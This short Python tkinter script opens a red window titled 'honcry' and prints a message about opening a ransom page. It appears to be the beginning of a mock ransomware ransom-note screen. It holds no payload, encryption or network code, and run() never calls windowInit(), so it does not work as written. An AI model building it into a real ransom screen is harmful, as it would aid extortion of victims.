import tkinter as tk
from tkinter import ttk
import pyautogui

def styles():
    style = ttk.Style()
    

def windowInit():
    global root
    root = tk.Tk()
    root.title("honcry")
    root.iconbitmap("./images/snake.ico")
    root.configure(bg="#CC0000")
    width, height, x, y = 900, 700, pyautogui.size().width // 2, pyautogui.size().height // 2
    root.geometry(f"{width}x{height}+{x-width//2}+{y-height//2}")
    root.resizable(False, False)

def run():
    print("開啟勒索頁面")
    styles()
    root.mainloop()

if __name__ == "__main__":
    run()